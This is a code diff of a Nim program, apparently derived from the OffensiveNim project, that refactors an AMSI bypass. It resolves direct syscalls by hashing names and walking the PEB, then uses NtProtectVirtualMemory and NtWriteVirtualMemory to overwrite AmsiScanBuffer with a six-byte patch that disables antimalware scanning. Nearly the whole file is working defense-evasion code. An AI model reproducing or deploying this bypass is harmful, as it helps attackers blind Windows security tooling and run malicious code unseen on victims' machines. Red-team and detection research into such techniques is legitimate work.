@@ -5,7 +5,7 @@ import std/dynlib
 import ptr_math
 
 # encode strings at compile time
-import strenc
+# import strenc
 
 {.passC:"-masm=intel".}
 
@@ -136,13 +136,21 @@ proc searchLoadedModules*(pCurrentPeb: PPEB, tableEntry: var HG_TABLE_ENTRY): bo
             break
     return false
 
-proc getSyscall*(tableEntry: var HG_TABLE_ENTRY): bool =
+proc getSyscall(tableEntry: var HG_TABLE_ENTRY): bool =
     let currentPeb: PPEB = GetPEBAsm64()
        
     if not searchLoadedModules(currentPeb, tableEntry):
         return false
 
     return true
+
+proc resolve_syscall*(syscall_name: string): HG_TABLE_ENTRY =
+    var hash: uint64 = djb2_hash(syscall_name)
+    var sC: HG_TABLE_ENTRY = HG_TABLE_ENTRY(dwHash: hash)
+    if not getSyscall(sC):
+        echo "[!] Error getting syscall: " & $syscall_name
+        quit(1)
+    return sC
 
 proc NtProtectVirtualMemory(ProcessHandle: Handle, BaseAddress: PVOID, NumberOfBytesToProtect: PULONG, NewAccessProtection: ULONG, OldAccessProtection: PULONG): NTSTATUS {.asmNoStackFrame.} =
     asm """
@@ -163,50 +171,42 @@ proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVO
     """
 
 when isMainModule:
-    var 
-        protectHash: uint64 = djb2_hash("NtProtectVirtualMemory")
-        ntProtect: HG_TABLE_ENTRY = HG_TABLE_ENTRY(dwHash: protectHash)
+    ntProtectSyscall = resolve_syscall("NtProtectVirtualMemory").wSysCall
+    ntWriteSyscall = resolve_syscall("NtWriteVirtualMemory").wSysCall
 
-        writeHash: uint64 = djb2_hash("NtWriteVirtualMemory")
-        ntWrite: HG_TABLE_ENTRY = HG_TABLE_ENTRY(dwHash: writeHash)
+    # https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim
+    when defined amd64:
+        echo "[*] Running in x64 process"
+        const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
+    elif defined i386:
+        {.error: "[!] x86 not supported!" }
 
-    if getSyscall(ntProtect) and getSyscall(ntWrite):
-        ntProtectSyscall = ntProtect.wSysCall
-        ntWriteSyscall = ntWrite.wSysCall
+    var
+        amsi: LibHandle
+        cs: pointer
+        op: ULONG
+        t: DWORD
 
-        # https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim
-        when defined amd64:
-            echo "[*] Running in x64 process"
-            const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
-        elif defined i386:
-            {.error: "[!] x86 not supported!" }
+    echo "[*] loading amsi"
+    amsi = loadLib("amsi")
+    if isNil(amsi):
+        echo "[!] Failed to load amsi.dll"
+        quit(1)
 
-        var
-            amsi: LibHandle
-            cs: pointer
-            op: ULONG
-            t: DWORD
+    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
+    if isNil(cs):
+        echo "[!] Failed to get the address of 'AmsiScanBuffer'"
+        quit(1)
 
-        echo "[*] loading amsi"
-        amsi = loadLib("amsi")
-        if isNil(amsi):
-            echo "[!] Failed to load amsi.dll"
-            quit(1)
+    var p_len = cast[ULONG](patch.len)
+    var cs_addr = cs
+    var status = NtProtectVirtualMemory(GetCurrentProcess(), &cs_addr, &p_len, cast[ULONG](PAGE_EXECUTE_READWRITE), &op)
+    if status == 0:
+        echo "[*] Applying patch"
 
-        cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
-        if isNil(cs):
-            echo "[!] Failed to get the address of 'AmsiScanBuffer'"
-            quit(1)
+        var bytesWritten: ULONG
+        var ret = NtWriteVirtualMemory(GetCurrentProcess(), cs, unsafeAddr patch, patch.len, addr bytesWritten)
 
-        var p_len = cast[ULONG](patch.len)
-        var cs_addr = cs
-        var status = NtProtectVirtualMemory(GetCurrentProcess(), &cs_addr, &p_len, cast[ULONG](PAGE_EXECUTE_READWRITE), &op)
-        if status == 0:
-            echo "[*] Applying patch"
-
-            var bytesWritten: ULONG
-            var ret = NtWriteVirtualMemory(GetCurrentProcess(), cs, unsafeAddr patch, patch.len, addr bytesWritten)
-
-            discard NtProtectVirtualMemory(GetCurrentProcess(), &cs_addr, &p_len, op, &t)
-        else:
-          echo "[!] Failed running ntprotectvirtualmemory: " & $status
+        discard NtProtectVirtualMemory(GetCurrentProcess(), &cs_addr, &p_len, op, &t)
+    else:
+        echo "[!] Failed running ntprotectvirtualmemory: " & $status
